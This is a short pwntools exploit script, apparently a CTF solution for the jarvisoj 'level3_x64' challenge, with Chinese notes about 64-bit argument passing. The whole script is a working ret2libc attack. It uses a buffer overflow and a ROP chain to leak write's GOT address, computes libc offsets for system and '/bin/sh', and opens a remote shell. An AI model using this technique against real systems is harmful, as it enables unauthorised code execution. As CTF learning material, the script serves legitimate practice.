#考点 64位程序的传参
#收获 彻底了解了一波leak的原理
#     写了工具函数
#     了解了需要的大部分地址可以通过ELF函数获取

from pwn import *

def leak(addres_start):
	ret1	  = 0x00000000004006b3
	value_rdi = 1               #stdout
	ret2      = 0x00000000004006b1
	write_plt = elf.plt["write"] 
	write_got = elf.got["write"] 

	payload = padding +  p64(ret1)  + p64(value_rdi)  + p64(ret2) + p64(write_got) + p64(0x1) +p64(write_plt) + p64(addres_start) 
	p.send(payload)
	addres_write = u64(p.recv(8))
	show("write"  , addres_write )
	p.recv()
	
	return addres_write

padding = 136 * 'a' 
p = remote("pwn2.jarvisoj.com" , 9883)

libc = ELF("./libc-2.19.so")
elf  = ELF("./level3_x64")
if __name__ == '__main__':
	addres_vul 		= elf.symbols["vulnerable_function"]
	addres_write 	= leak(addres_vul)
	offset_binsh    = libc.search("/bin/sh").next() 
	offset_system 	= libc.symbols["system"]
	offset_write  	= libc.symbols["write"]

	addres_binsh 	= addres_write + (offset_binsh - offset_write)
	addres_system	= addres_write + (offset_system - offset_write)
	addres_pr   	= 0x4006b3

	payload 		= padding + p64(addres_pr) + p64(addres_binsh) + p64(addres_system)
	p.recv()  # clear
	p.send(payload)
	p.interactive()